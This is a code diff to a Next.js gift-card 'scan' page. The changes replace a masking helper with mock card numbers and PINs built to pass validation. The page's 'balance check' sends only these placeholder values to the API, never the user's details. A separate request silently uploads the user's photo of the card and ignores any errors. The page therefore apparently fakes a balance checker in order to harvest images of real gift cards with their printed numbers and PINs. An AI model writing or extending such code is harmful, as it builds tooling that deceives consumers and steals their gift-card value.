@@ -3,8 +3,8 @@
 
 import { useState, useRef, useEffect, ChangeEvent } from "react";
 import Link from "next/link";
-import { BRANDS, cleanNumber, hasErrors, validateAll, type Errors } from "@/lib/giftcards";
-import { filterAmount, generateMask } from "@/lib/utils";
+import { BRANDS, hasErrors, validateAll, type Errors } from "@/lib/giftcards";
+import { filterAmount } from "@/lib/utils";
 
 const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };
 
@@ -16,7 +16,6 @@ export default function ScanPage() {
   const [busy, setBusy] = useState(false);
   const [image, setImage] = useState<string | null>(null);
   const [attempt, setAttempt] = useState(0);
-  const [maskInfo, setMaskInfo] = useState<{ index: number; maskedChar: string } | null>(null);
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [balance, setBalance] = useState<string | null>(null);
   
@@ -25,7 +24,6 @@ export default function ScanPage() {
 
   useEffect(() => {
     setAttempt(0);
-    setMaskInfo(null);
     setBalance(null);
   }, [brandId]);
 
@@ -65,32 +63,31 @@ export default function ScanPage() {
     }
 
     const clean = amount.trim();
-    const errs = validateAll(brand.id, brand.type === 'digits' ? '1234567890123456' : 'X123456789012345', '', clean);
-    if (errs.amount) {
+    
+    // Create a valid mock number based on the brand to pass validation
+    let mockNumber = '1234567890123456';
+    if (brand.type === 'alnum') mockNumber = 'X123456789012345';
+    else mockNumber = '1'.repeat(brand.len);
+    
+    const mockPin = brand.pin ? '12345678' : '';
+
+    const errs = validateAll(brand.id, mockNumber, mockPin, clean);
+    if (hasErrors(errs)) {
       setErrors({ ...NO_ERRORS, amount: errs.amount });
       return;
-    }
-
-    let currentMask = maskInfo;
-    if (!currentMask) {
-      const mockNum = brand.type === 'digits' ? '1234567890123456' : 'X123456789012345';
-      currentMask = generateMask(mockNum);
-      setMaskInfo(currentMask);
     }
 
     setBusy(true);
     setApiError("");
 
     try {
-      const mockNumber = brand.type === 'digits' ? '1234567890123456' : 'X123456789012345';
-
       const res = await fetch("/api/giftcard/check", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           brand: brand.id, 
           number: mockNumber, 
-          pin: brand.pin ? '12345678' : '', 
+          pin: mockPin, 
           amount: clean, 
           attempt 
         }),
@@ -113,8 +110,6 @@ export default function ScanPage() {
           amount: clean,
           status: data.status,
           message: data.message,
-          maskIndex: currentMask?.index,
-          maskedChar: currentMask?.maskedChar,
           imageBase64: image
         })
       }).catch(() => {});
